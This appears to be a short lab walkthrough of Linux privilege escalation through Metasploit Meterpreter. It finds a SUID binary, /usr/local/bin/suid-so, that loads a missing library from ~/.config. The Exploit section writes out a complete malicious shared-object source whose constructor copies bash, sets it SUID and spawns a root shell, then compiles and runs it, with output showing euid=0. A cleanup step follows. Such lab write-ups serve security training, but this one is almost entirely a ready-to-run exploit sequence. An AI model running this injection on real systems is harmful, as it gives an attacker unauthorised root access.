# Metasploit

## 01 - Detect

```
meterpreter > run post/linux/gather/enum_system

[+] Info:
[+]     Debian GNU/Linux 6.0
[+]     Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
[+]     Module running as "user" user
..[omitted]..
[*] Setuid/setgid files stored in /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_075325.txt
..[omitted]..

userware@hackware-os:~$ sudo cat /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_075325.txt
..[omitted]..
/usr/local/bin/suid-so
..[omitted]..

meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 3384 created.
Channel 66 created.
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
ch file"usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no su 
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 4
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 4
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
user@debian:~$ exit
exit
exit
```

## 02 - Exploit

```
meterpreter > pwd
/home/user
meterpreter > mkdir .config
Creating directory: .config
meterpreter > cd .config/
meterpreter > edit libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
meterpreter > execute -if gcc -a "-shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c"
Process 3449 created.
Channel 72 created.
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 3454 created.
Channel 73 created.
user@debian:~/.config$ suid-so
suid-so
Calculating something, please wait...
bash-4.1# id
id
uid=1000(user) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# exit
exit
exit
[=====================================================================>] 99 %
Done.
user@debian:~/.config$ exit
exit
exit
```

## 03 - Cleanup

```
meterpreter > cd ..
meterpreter > rmdir .config
Removing directory: .config
```